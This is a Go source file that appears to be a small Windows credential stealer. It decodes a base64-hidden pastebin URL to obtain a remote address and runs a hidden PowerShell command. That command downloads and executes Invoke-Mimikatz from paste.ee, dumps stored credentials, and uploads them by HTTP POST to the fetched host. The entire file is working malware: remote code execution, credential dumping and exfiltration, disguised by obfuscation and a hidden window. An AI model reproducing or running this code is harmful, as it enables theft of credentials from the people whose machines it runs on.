package main

import "os/exec"
import "syscall"
import (
	"io/ioutil"
	"strings"
	"net/http"
	"fmt"
)

import "encoding/base64"

func Base64Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func Base64Decode(str string) string {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return ""
	}
	return string(data)
}


//Start command in minimized window and returns output

func GetIp() string { 
	resp, _ := http.Get(Base64Decode("aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvQnVHOTdCU2s="))
	defer resp.Body.Close()
	respBody, _ := ioutil.ReadAll(resp.Body)

	return strings.TrimLeft(string(respBody), "tcp://")
}

func Run(cmd string) string {
	e := exec.Command("cmd", "/C", cmd)
	e.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	e.Run()
	res, _ := e.Output()
	return string(res)
}


func main() {
	fmt.Println(Run(`powershell "IEX (New-Object Net.WebClient).DownloadString('https://paste.ee/r/0ZlX2'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('http://`+GetIp()+`', 'POST' , $output)"`))
}